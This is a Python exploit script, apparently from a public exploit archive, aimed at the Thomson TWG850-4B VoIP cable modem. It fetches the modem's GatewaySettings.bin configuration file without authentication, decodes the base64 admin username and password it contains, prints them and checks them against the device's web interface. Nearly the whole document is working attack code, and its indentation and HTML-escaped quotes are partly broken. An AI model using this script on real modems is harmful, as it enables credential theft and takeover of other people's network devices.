#+-////////////////////////////////////////////////////////////////////////////
#+-
#+- Exploit Title: Thomson Wireless VoIP Cable Modem Arbitrary File Access 
#+- Date: October 22, 2013
#+- Author: Glaysson dos Santos
#+-
#+- Product: TWG850-4B Wireless VoIP Cable Modem
#+- Software Version: ST9C.05.08
#+- Hardware Version: 2.1
#+- BOOT Revision: 2.1.7i
#+- Standard Specification Compliant: DOCSIS 2.0
#+- Firmware Name: DWG850-4-9C.05.08-110217-S-1FF.bin
#+- Firmware Build Time 19:19:19 Thu Feb 17 2011
#+- Severity: High
#+-
#+-\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
################################################################################
 
 
import string
import urllib2
import sys
from time import sleep
import base64
import binascii
import os
 
save  = &#039;log_TWG8504B.txt&#039;
log   = open(save,&#039;w&#039;)
bifi  = &#039;GatewaySettings.bin&#039;
refi  = &#039;RgComputers.asp&#039;
R_C   = ("\033[0;31m")
G_C   = ("\033[1;32m")
D_C   = ("\033[0m"   )
 
 
def banner():
    os.system(&#039;clear&#039;)
    print "\nThomson Wireless VoIP Cable Modem DWG850 -4B (Software Version:ST9C.05.08)- Arbitrary File Read\n \
            \t- 2013 - Glaysson dos Santos (0cn1)\n\n"
 
 
def hr_data(filename, min=4):
    with open(filename, "rb") as f:
            result = ""
            for c in f.read():
                    if c in string.printable:
                        result += c
                        continue
                    if len(result) >= min:
                        yield result
                print >> log, result
                    result = ""
        print "(+)- Others Informations Extracted Saved in %s, but you&#039;ve a Admin Password :D\n"%(save)
 
def checkcreds(router,username,password):
    auth_handler = urllib2.HTTPBasicAuthHandler()
    auth_handler.add_password(realm=&#039;Thomson&#039;,
                          uri   = router,
                          user  = username,
                          passwd= password)
    opener = urllib2.build_opener(auth_handler)
    try:
            urllib2.install_opener(opener)
            status = urllib2.urlopen(&#039;%s/%s&#039;%(router,refi))
            print &#039;(+)- [status:%s%s%s] Authenticated successfuly, Enjoy it!&#039;%(G_C,status.code,D_C)
 
    except urllib2.URLError, e:
            if e.code == 401:
                print &#039;(+)- [status:%s%s%s] Invalid Credentials! Try yourself in a browser.&#039;%(R_C,e.code,D_C)
 
def checkvuln(router):
    try:
        print &#039;(+)- Checking if target is vulnerable...&#039;
        req = urllib2.Request(&#039;%s/%s&#039;%(router,bifi))
        response = urllib2.urlopen(req)
        page = response.read()
        x = open(bifi,&#039;wb&#039;)
        x.write(page)
        x.close()
        sleep(1)
        print &#039;(+)- The target appears to be vulnerable, lets check it better!&#039;
        print &#039;(+)- Searching Credentials...&#039;
        sleep(1)
        for s in hr_data(bifi):
            try:
                dec = base64.decodestring(s)
                if dec.find(&#039;:&#039;) != -1:
                    user,passwd = dec.split(&#039;:&#039;)
                    print &#039;(+)- User: %s%s%s&#039;%(G_C,user,D_C)
                    print &#039;(+)- Pass: %s%s%s&#039;%(G_C,passwd,D_C)
                     
                    print &#039;(+)- Checking if creds are OK...&#039;
                    checkcreds(router,user,passwd)
                     
            except(binascii.Error):
                pass
    except urllib2.URLError, e:
        print &#039;[$] hollyshit! the target is not vuln! o.O (%s%s%s)&#039;%(R_C,e.reason[1],D_C)
        sys.exit(1)
 
if __name__ == "__main__":
    banner()
        if len(sys.argv) != 2:
                print &#039;[!] %sRun %s router IP%s\n&#039;%(R_C,sys.argv[0],D_C)
                sys.exit(2)
     
        router = sys.argv[1]
        if not "http" in router:
                        router = "http://"+(sys.argv[1])
        checkvuln(router)

